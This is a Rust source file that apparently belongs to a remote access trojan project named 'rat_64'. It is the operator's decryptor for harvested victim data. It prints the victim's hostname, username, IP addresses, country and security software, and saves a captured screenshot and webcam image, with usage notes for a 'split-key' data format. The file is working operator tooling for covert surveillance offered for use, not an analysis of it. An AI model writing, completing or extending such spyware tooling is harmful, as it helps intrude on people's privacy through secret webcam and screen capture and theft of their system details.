use std::env;
use rat_64::decrypt::{decrypt_data_file, save_screenshot, save_webcam_image};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 2 {
        eprintln!("Usage: {} <data.dat> [key.bin]", args[0]);
        eprintln!("Examples:");
        eprintln!("  {} data.dat              # search for key.bin automatically", args[0]);
        eprintln!("  {} data.dat my_key.bin   # use the specified key file", args[0]);
        return Ok(());
    }

    let data_file = &args[1];
    let key_file = args.get(2).map(|s| s.as_str());

    println!("Decrypting: {}", data_file);
    if let Some(key) = key_file {
        println!("Key file: {}", key);
    }

    // Decrypt the data
    match decrypt_data_file(data_file, key_file) {
        Ok((system_info, image_data)) => {
            println!("\n=== System information ===");
            println!("Hostname: {}", system_info.hostname);
            println!("OS: {} {}", system_info.os_name, system_info.os_version);
            println!("Username: {}", system_info.username);
            println!("Processor: {}", system_info.processor);
            println!("CPU cores: {}", system_info.cores);
            println!("Local IP: {}", system_info.local_ip);
            println!("Global IP: {}", system_info.global_ip);
            println!("Country code: {}", system_info.country_code);
            
            if !system_info.security_software.is_empty() {
                println!("Security software: {:?}", system_info.security_software);
            }

            // Save images
            if !image_data.screenshot.is_empty() {
                match save_screenshot(&image_data.screenshot, "screenshot.png") {
                    Ok(_) => println!("\nSaved screenshot: screenshot.png"),
                    Err(e) => eprintln!("Failed to save screenshot: {}", e),
                }
            } else {
                println!("\nScreenshot: none");
            }

            if !image_data.webcam_image.is_empty() {
                match save_webcam_image(&image_data.webcam_image, "webcam.png") {
                    Ok(_) => println!("Saved webcam image: webcam.png"),
                    Err(e) => eprintln!("Failed to save webcam image: {}", e),
                }
            } else {
                println!("Webcam image: none");
            }
        }
        Err(e) => {
            eprintln!("Decryption error: {}", e);
            eprintln!("\nThis tool only supports the new split-key format. Please check the following:");
            eprintln!("- Ensure data.dat was created using the new split-key format");
            eprintln!("- Verify key.bin exists in the same directory");
            eprintln!("- Confirm the key file matches the data file");
            eprintln!("- Check that the files are not corrupted");
            eprintln!("\nNote: legacy embedded-key files are not supported.");
        }
    }

    Ok(())
}